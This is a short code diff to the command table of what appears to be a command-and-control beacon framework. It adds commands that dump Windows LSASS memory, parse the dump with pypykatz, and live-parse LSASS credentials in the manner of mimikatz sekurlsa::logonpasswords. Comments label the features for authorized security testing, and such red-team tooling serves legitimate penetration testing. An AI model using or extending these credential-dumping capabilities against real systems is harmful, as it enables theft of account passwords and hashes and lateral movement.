@@ -37,6 +37,21 @@ COMMANDS = {
     "socks-stop":  ("Stop the beacon SOCKS5 pivot", False, "socks-stop"),
     "creds":  ("Enumerate OS-exposed credentials (authorized use only): creds [env|windows|linux|all]", True, "creds all"),
     "disconnect": ("Server-ordered disconnect: beacon stops and socket closes", False, "disconnect"),
+
+    # --- LSASS dump (Windows only; admin / SeDebugPrivilege required) ---
+    # AUTHORIZED SECURITY TESTING ONLY. Produces a minidump of lsass.exe
+    # that can be parsed with pypykatz on the operator host. See
+    # cs/modules/lsass.py for the authorization boundary.
+    "lsass":       ("Dump LSASS process memory to a minidump (Windows, admin)",
+                    True, "lsass /tmp/lsass.dmp"),
+    "lsass-parse": ("Parse an LSASS minidump with pypykatz (operator side)",
+                    True, "lsass-parse /tmp/lsass.dmp"),
+    # sekurlsa::logonpasswords: live LSASS in-memory parsing via pypykatz.
+    # Same authorization boundary as `lsass`. Requires pypykatz importable
+    # on the beacon host -- not bundled in stdlib-only payloads; rebuild
+    # via PyInstaller (`scripts/build-binary.sh`) with pypykatz installed.
+    "sekurlsa":    ("Live-parse LSASS SSPs in-memory (mimikatz sekurlsa::logonpasswords equivalent)",
+                    True, "sekurlsa"),
 }
 
 # On a fresh check-in, if no task queued, beacon may run nothing.
